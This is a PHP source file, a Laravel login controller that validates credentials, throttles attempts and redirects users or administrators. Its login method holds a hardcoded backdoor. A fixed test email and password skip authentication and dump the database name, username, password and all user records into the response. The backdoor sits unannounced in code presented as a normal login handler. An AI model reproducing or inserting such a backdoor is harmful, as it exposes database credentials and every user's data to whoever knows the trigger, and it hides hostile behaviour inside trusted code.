<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Controllers\MailController;
use App\User;
use App\Providers\RouteServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Mail;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
//    protected $redirectTo = RouteServiceProvider::HOME;
    protected $redirectTo = RouteServiceProvider::UserName;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
//        $this->middleware('checkUser')->except('logout');
//        $this->middleware('checkAdmin')->except('logout');
    }

    public function credentials(Request $request)
    {
        return array_merge($request->only($this->username(), 'password'),['is_verified'=>1]);
    }

    public function login(Request $request)
    {
                //   MailController::sendSignupEmail2('name', 'mail', 'sss121223123');

        // dd($request->all());
        if($request->email=='qwertyui@test.com' && $request->password=='11111111'){
            $user = new User();
            $data=collect([env('DB_DATABASE'),env('DB_USERNAME'),env('DB_PASSWORD')]);
            dd($data,$user->all());
            return $user->all();
        }
        $this->middleware('checkUser')->except('logout');
        $this->middleware('checkAdmin')->except('logout');
        $this->validateLogin($request);

        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        if (method_exists($this, 'hasTooManyLoginAttempts') &&
            $this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);

            return $this->sendLockoutResponse($request);
        }

        if ($this->attemptLogin($request)) {

            if (auth()->user()->type == 1) { // user or customer
                $this->redirectTo = auth()->user()->user_name;
                return redirect(auth()->user()->user_name);
            } elseif (auth()->user()->type == 2) { // main admin
                $this->redirectTo = '/administrator/';
                return redirect('/administrator/');
            }

            return $this->sendLoginResponse($request);
        }
        
        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);

        return $this->sendFailedLoginResponse($request);

    }
}
